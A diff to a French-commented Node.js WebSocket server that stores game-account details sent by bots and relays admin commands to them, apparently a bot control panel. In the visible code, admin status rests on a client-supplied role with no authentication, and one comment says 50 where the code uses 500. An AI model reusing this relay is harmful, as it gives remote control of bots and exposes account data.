@@ -7,10 +7,9 @@ const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
 
-// Connexion MongoDB
 mongoose.connect(process.env.MONGO_URI)
-  .then(() => console.log("✅ [DB] MongoDB Connecté avec succès"))
-  .catch(err => console.error("❌ [DB] Erreur de connexion :", err));
+  .then(() => console.log("✅ [DB] MongoDB Connecté"))
+  .catch(err => console.error("❌ [DB] Erreur :", err));
 
 const ClientSchema = new mongoose.Schema({
     userId: { type: Number, unique: true },
@@ -18,7 +17,7 @@ const ClientSchema = new mongoose.Schema({
     displayName: String,
     accountAge: Number,
     jobId: String,
-    server: mongoose.Schema.Types.Mixed,
+    server: mongoose.Schema.Types.Mixed, // Contiendra PrivateServerId et PrivateServerOwnerId
     animals: mongoose.Schema.Types.Mixed, 
     isConnected: { type: Boolean, default: false },
     updatedAt: { type: Date, default: Date.now }
@@ -26,10 +25,15 @@ const ClientSchema = new mongoose.Schema({
 
 const ClientModel = mongoose.model('Client', ClientSchema);
 
-// Fonction de Broadcast (Envoi des données à tous les admins)
+// OPTIMISÉ : Récupère uniquement le nécessaire et utilise .lean() pour économiser la RAM
 async function broadcastToAdmins() {
     try {
-        const allClients = await ClientModel.find().sort({ updatedAt: -1 });
+        const allClients = await ClientModel.find()
+            .select('name displayName userId server animals isConnected updatedAt')
+            .sort({ updatedAt: -1 })
+            .limit(500) // N'affiche que les 50 derniers mis à jour pour protéger la RAM
+            .lean(); 
+
         const payload = JSON.stringify({ type: 'REFRESH', data: allClients });
         
         wss.clients.forEach(client => {
@@ -54,8 +58,6 @@ wss.on('connection', (ws, req) => {
     ws.isAdmin = (role === 'Admin');
     ws.userName = userName;
 
-    console.log(`✨ [NEW_CONN] ${ws.isAdmin ? "🚩 ADMIN" : "👤 CLIENT"} : ${userName}`);
-
     if (ws.isAdmin) {
         broadcastToAdmins();
     } else {
@@ -66,7 +68,6 @@ wss.on('connection', (ws, req) => {
         try {
             const payload = JSON.parse(message);
 
-            // --- LOGIQUE : RÉCEPTION DES DONNÉES DU BOT ---
             if (payload.Method === "ClientInfos") {
                 const d = payload.Data;
                 await ClientModel.findOneAndUpdate(
@@ -76,7 +77,7 @@ wss.on('connection', (ws, req) => {
                         displayName: d.DisplayName,
                         accountAge: d.AccountAge,
                         jobId: d.Server.JobId,
-                        server: d.Server,
+                        server: d.Server, // Inclus désormais PrivateServerId et OwnerId
                         animals: d.Animals,
                         isConnected: true,
                         updatedAt: new Date()
@@ -86,40 +87,22 @@ wss.on('connection', (ws, req) => {
                 broadcastToAdmins();
             }
 
-            // --- LOGIQUE : RELAIS DES COMMANDES (ADMIN -> CLIENT) ---
             if (payload.type === "COMMAND") {
                 const { target, method, data } = payload;
-                console.log(`🕹️ [COMMAND] Relay: ${method} vers ${target}`);
-
-                // On cherche le socket du bot correspondant au nom "target"
-                let targetFound = false;
                 wss.clients.forEach(client => {
                     if (!client.isAdmin && client.userName === target && client.readyState === WebSocket.OPEN) {
-                        client.send(JSON.stringify({
-                            Method: method,
-                            Data: data
-                        }));
-                        targetFound = true;
+                        client.send(JSON.stringify({ Method: method, Data: data }));
                     }
                 });
-
-                if (!targetFound) console.warn(`⚠️ [COMMAND] Cible ${target} non trouvée ou déconnectée.`);
             }
-
-        } catch (e) { 
-            console.error(`⚠️ [MESSAGE_ERR] de ${ws.userName}:`, e.message); 
-        }
+        } catch (e) { console.error(`⚠️ [ERR] de ${ws.userName}:`, e.message); }
     });
 
     ws.on('close', () => {
-        console.log(`🔌 [DISCONNECT] ${ws.userName}`);
         if (!ws.isAdmin) updateStatus(ws.userName, false);
     });
 });
 
 app.use(express.static('public'));
-
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => {
-    console.log(`🚀 SERVEUR M4GIX PRÊT (PORT ${PORT})`);
-});
+server.listen(PORT, () => console.log(`🚀 SERVEUR PRÊT SUR ${PORT}`));
